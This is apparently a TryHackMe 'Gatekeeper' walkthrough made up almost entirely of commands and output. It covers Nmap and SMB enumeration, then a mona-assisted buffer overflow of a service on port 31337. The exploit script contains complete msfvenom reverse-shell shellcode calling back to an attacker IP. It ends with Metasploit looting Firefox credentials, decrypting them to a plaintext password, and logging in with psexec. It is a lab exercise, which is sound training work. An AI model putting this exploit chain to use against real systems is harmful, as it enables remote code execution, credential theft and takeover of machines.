#THM  #Windows #buffOverflow  #Firefox #EnumerateSmb #Metasploit 

#### Nmap
* TARGET: 10.10.121.153
* US: 10.11.57.111

```bash
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=gatekeeper
| Not valid before: 2021-12-21T19:10:08
|_Not valid after:  2022-06-22T19:10:08
|_ssl-date: 2021-12-22T19:14:42+00:00; +2s from scanner time.
31337/tcp open  Elite?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     Hello GET /nice%20ports%2C/Tri%6Eity.txt%2ebak HTTP/1.0
|     Hello
|   GenericLines: 
|     Hello 
|     Hello
|   GetRequest: 
|     Hello GET / HTTP/1.0
|     Hello
|   HTTPOptions: 
|     Hello OPTIONS / HTTP/1.0
|     Hello
|   Help: 
|     Hello HELP
|   Kerberos: 
|     Hello !!!
|   LDAPSearchReq: 
|     Hello 0
|     Hello
|   LPDString: 
|     Hello 
|     default!!!
|   RTSPRequest: 
|     Hello OPTIONS / RTSP/1.0
|     Hello
|   SIPOptions: 
|     Hello OPTIONS sip:nm SIP/2.0
|     Hello Via: SIP/2.0/TCP nm;branch=foo
|     Hello From: <sip:nm@nm>;tag=root
|     Hello To: <sip:nm2@nm2>
|     Hello Call-ID: 50000
|     Hello CSeq: 42 OPTIONS
|     Hello Max-Forwards: 70
|     Hello Content-Length: 0
|     Hello Contact: <sip:nm@nm>
|     Hello Accept: application/sdp
|     Hello
|   SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|_    Hello
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49161/tcp open  msrpc              Microsoft Windows RPC
49165/tcp open  msrpc              Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port31337-TCP:V=7.92%I=7%D=12/22%Time=61C37888%P=x86_64-pc-linux-gnu%r(
SF:GetRequest,24,"Hello\x20GET\x20/\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n")%
SF:r(SIPOptions,142,"Hello\x20OPTIONS\x20sip:nm\x20SIP/2\.0\r!!!\nHello\x2
SF:0Via:\x20SIP/2\.0/TCP\x20nm;branch=foo\r!!!\nHello\x20From:\x20<sip:nm@
SF:nm>;tag=root\r!!!\nHello\x20To:\x20<sip:nm2@nm2>\r!!!\nHello\x20Call-ID
SF::\x2050000\r!!!\nHello\x20CSeq:\x2042\x20OPTIONS\r!!!\nHello\x20Max-For
SF:wards:\x2070\r!!!\nHello\x20Content-Length:\x200\r!!!\nHello\x20Contact
SF::\x20<sip:nm@nm>\r!!!\nHello\x20Accept:\x20application/sdp\r!!!\nHello\
SF:x20\r!!!\n")%r(GenericLines,16,"Hello\x20\r!!!\nHello\x20\r!!!\n")%r(HT
SF:TPOptions,28,"Hello\x20OPTIONS\x20/\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n
SF:")%r(RTSPRequest,28,"Hello\x20OPTIONS\x20/\x20RTSP/1\.0\r!!!\nHello\x20
SF:\r!!!\n")%r(Help,F,"Hello\x20HELP\r!!!\n")%r(SSLSessionReq,C,"Hello\x20
SF:\x16\x03!!!\n")%r(TerminalServerCookie,B,"Hello\x20\x03!!!\n")%r(TLSSes
SF:sionReq,C,"Hello\x20\x16\x03!!!\n")%r(Kerberos,A,"Hello\x20!!!\n")%r(Fo
SF:urOhFourRequest,47,"Hello\x20GET\x20/nice%20ports%2C/Tri%6Eity\.txt%2eb
SF:ak\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n")%r(LPDString,12,"Hello\x20\x01d
SF:efault!!!\n")%r(LDAPSearchReq,17,"Hello\x200\x84!!!\nHello\x20\x01!!!\n
SF:");
Service Info: Host: GATEKEEPER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
   |_clock-skew: mean: 1h15m01s, deviation: 2h30m00s, median: 1s
   | smb-os-discovery: 
   |   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
   |   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
   |   Computer name: gatekeeper
   |   NetBIOS computer name: GATEKEEPER\x00
   |   Workgroup: WORKGROUP\x00
   |_  System time: 2021-12-22T14:14:36-05:00
   | smb-security-mode: 
   |   account_used: guest
   |   authentication_level: user
   |   challenge_response: supported
   |_  message_signing: disabled (dangerous, but default)
   | smb2-security-mode: 
   |   2.1: 
   |_    Message signing enabled but not required
   |_nbstat: NetBIOS name: GATEKEEPER, NetBIOS user: <unknown>, NetBIOS MAC: 02:b5:fb:90:13:45 (unknown)
   | smb2-time: 
   |   date: 2021-12-22T19:14:36
   |_  start_date: 2021-12-22T19:09:48

```

#### SMB Enumeration

```bash
Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.121.153\ADMIN$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Remote Admin
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.121.153\C$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Default share
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.121.153\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: Remote IPC
|     Anonymous access: READ
|     Current user access: READ/WRITE
|   \\10.10.121.153\Users: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Anonymous access: <none>
|_    Current user access: READ
```

* Userser
	* anonymous login
		* gatekeeper.exe

#### Gatekeeper on 31337

```py

import socket  
  
ip = "127.0.0.1"  
port = 31337  
offset = 0  
overflow = "A" * offset  
retn = ""  
padding = ""  
payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6A..."
postfix = ""  
buffer = overflow + retn + padding + payload + postfix  
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
username = b"give me shell pls"  
try:  
 s.connect((ip, port))  
 print("Sending evil buffer...")  
 s.send(bytes(buffer + "\r\n", "latin-1"))  
 print("Done!")  
except:  
 print("Could not connect.")
 
[*] Exact match at offset 146
```

```
!mona config -set workingfolder c:\mona\%p
```

```
!mona compare -f C:\mona\gatekeeper\bytearray.bin -a <esp>
```

* bad chars
	* \x00\x0a

```
!mona jmp -r esp -cpb "\x00\x01"

080414C3 -> \xc3\x14\x04\x08
```

#### Payload & Exploit

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.57.111 LPORT=4444 EXITFUNC=thread -b "\x00\x0a" -f py -v payload
```

```py

import socket  
  
ip = "127.0.0.1"  
port = 31337  
offset = 146  
overflow = b"A" * offset  
retn = b"\xc3\x14\x04\x08"  
  
payload = b""  
payload += b"\xbf\x9e\xa3\xbd\xaa\xda\xc8\xd9\x74\x24\xf4\x5d"  
payload += b"\x2b\xc9\xb1\x52\x31\x7d\x12\x83\xc5\x04\x03\xe3"  
payload += b"\xad\x5f\x5f\xe7\x5a\x1d\xa0\x17\x9b\x42\x28\xf2"  
payload += b"\xaa\x42\x4e\x77\x9c\x72\x04\xd5\x11\xf8\x48\xcd"  
payload += b"\xa2\x8c\x44\xe2\x03\x3a\xb3\xcd\x94\x17\x87\x4c"  
payload += b"\x17\x6a\xd4\xae\x26\xa5\x29\xaf\x6f\xd8\xc0\xfd"  
payload += b"\x38\x96\x77\x11\x4c\xe2\x4b\x9a\x1e\xe2\xcb\x7f"  
payload += b"\xd6\x05\xfd\x2e\x6c\x5c\xdd\xd1\xa1\xd4\x54\xc9"  
payload += b"\xa6\xd1\x2f\x62\x1c\xad\xb1\xa2\x6c\x4e\x1d\x8b"  
payload += b"\x40\xbd\x5f\xcc\x67\x5e\x2a\x24\x94\xe3\x2d\xf3"  
payload += b"\xe6\x3f\xbb\xe7\x41\xcb\x1b\xc3\x70\x18\xfd\x80"  
payload += b"\x7f\xd5\x89\xce\x63\xe8\x5e\x65\x9f\x61\x61\xa9"  
payload += b"\x29\x31\x46\x6d\x71\xe1\xe7\x34\xdf\x44\x17\x26"  
payload += b"\x80\x39\xbd\x2d\x2d\x2d\xcc\x6c\x3a\x82\xfd\x8e"  
payload += b"\xba\x8c\x76\xfd\x88\x13\x2d\x69\xa1\xdc\xeb\x6e"  
payload += b"\xc6\xf6\x4c\xe0\x39\xf9\xac\x29\xfe\xad\xfc\x41"  
payload += b"\xd7\xcd\x96\x91\xd8\x1b\x38\xc1\x76\xf4\xf9\xb1"  
payload += b"\x36\xa4\x91\xdb\xb8\x9b\x82\xe4\x12\xb4\x29\x1f"  
payload += b"\xf5\xb1\xa6\x26\x6a\xae\xba\x58\x65\x72\x32\xbe"  
payload += b"\xef\x9a\x12\x69\x98\x03\x3f\xe1\x39\xcb\x95\x8c"  
payload += b"\x7a\x47\x1a\x71\x34\xa0\x57\x61\xa1\x40\x22\xdb"  
payload += b"\x64\x5e\x98\x73\xea\xcd\x47\x83\x65\xee\xdf\xd4"  
payload += b"\x22\xc0\x29\xb0\xde\x7b\x80\xa6\x22\x1d\xeb\x62"  
payload += b"\xf9\xde\xf2\x6b\x8c\x5b\xd1\x7b\x48\x63\x5d\x2f"  
payload += b"\x04\x32\x0b\x99\xe2\xec\xfd\x73\xbd\x43\x54\x13"  
payload += b"\x38\xa8\x67\x65\x45\xe5\x11\x89\xf4\x50\x64\xb6"  
payload += b"\x39\x35\x60\xcf\x27\xa5\x8f\x1a\xec\xc5\x6d\x8e"  
payload += b"\x19\x6e\x28\x5b\xa0\xf3\xcb\xb6\xe7\x0d\x48\x32"  
payload += b"\x98\xe9\x50\x37\x9d\xb6\xd6\xa4\xef\xa7\xb2\xca"  
payload += b"\x5c\xc7\x96"  
  
  
padding = b"\x90" * 16  
buffer = overflow + retn + padding + payload  
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
  
try:  
	s.connect((ip, port))  
	print("Sending evil buffer...")  
	s.send(bytes(buffer + b"\r\n"))  
	print("Done!")  
except:  
	print("Could not connect.")
	
metasploit >
```

#### Firefox Credentials 

```bash
metasploit > run multi/gather/firefox_creds

[!] SESSION may not be compatible with this module:
[!]  * missing Meterpreter features: stdapi_sys_process_set_term_size
[-] Error loading USER S-1-5-21-663372427-3699997616-3390412905-1000: Hive could not be loaded, are you Admin?
[*] Checking for Firefox profile in: C:\Users\natbat\AppData\Roaming\Mozilla\

[*] Profile: C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release
[+] Downloaded cert9.db: /home/user/.msf4/loot/20211222214927_default_10.10.104.216_ff.ljfn812a.cert_798220.bin
[+] Downloaded cookies.sqlite: /home/user/.msf4/loot/20211222214928_default_10.10.104.216_ff.ljfn812a.cook_661654.bin
[+] Downloaded key4.db: /home/user/.msf4/loot/20211222214930_default_10.10.104.216_ff.ljfn812a.key4_971104.bin
[+] Downloaded logins.json: /home/user/.msf4/loot/20211222214931_default_10.10.104.216_ff.ljfn812a.logi_992279.bin

[*] Profile: C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\rajfzh3y.default

> rename to correct file again (.bin packed)

> firefox_decrypt.py

Username: 'mayor'
Password: '8CL7O1N78MdrCIsV'
```

```py
psexec.py mayor:8CL7O1N78MdrCIsV@10.10.104.216
C:\Windows\system32>
```